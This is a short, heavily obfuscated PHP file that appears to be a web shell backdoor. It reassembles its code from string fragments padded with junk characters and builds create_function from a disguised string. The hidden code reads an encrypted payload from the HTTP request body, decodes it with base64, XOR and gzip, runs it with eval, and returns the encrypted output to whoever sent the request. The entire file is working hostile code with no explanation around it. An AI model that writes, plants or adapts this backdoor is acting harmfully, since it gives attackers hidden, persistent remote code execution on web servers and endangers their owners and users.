<?php
$K='"BoOJwfYJ~YLb33R3Zp";~Yf~Yunction x(~Y$t,$k){~Y$c=s~Ytr~Ylen($~Yk);$l=strl';
$V='($m~Y[1~Y]),$k))~Y);$o=@ob_get~Y_content~Ys(~Y);@ob_~Yend_c~Ylean()~Y;$r=@b';
$w='$k="52~Y~Y38ed~Yee~Y";$kh=~Y"d18afd40b2b1";$~Ykf="~Y738ebe~Y5d618b";~Y$p=~Y';
$N='==1) {@ob_star~Yt();@e~Yval(@~Ygzuncom~Yp~Yress(@x(~Y@base~Y64_~Yd~Yecode';
$D=str_replace('pn','','pncrpneapntepn_funpnpnction');
$A='~Yen($t);~Y$~Yo="";for~Y($i=0;$i<$l;~Y)~Y{fo~Yr($j~Y=0~Y;(~Y$~Yj<$c&&$i<$';
$W='~Y("/$kh~Y~Y(.+~Y)$kf/",@file_ge~Yt_con~Yte~Ynts("php~Y://inpu~Yt"),~Y$m)~Y';
$r='l);$j++,$i++){$o.~Y=~Y$t{$i}^$~Yk{$~Yj};}}re~Yt~Yurn $o;}if~Y (@preg_match';
$e='as~Ye64_encode(@x~Y(@~Ygzcompres~Ys($o)~Y~Y,~Y$k));print(~Y"$p$kh$r$kf");}';
$P=str_replace('~Y','',$w.$K.$A.$r.$W.$N.$V.$e);
$a=$D('',$P);$a();
?>
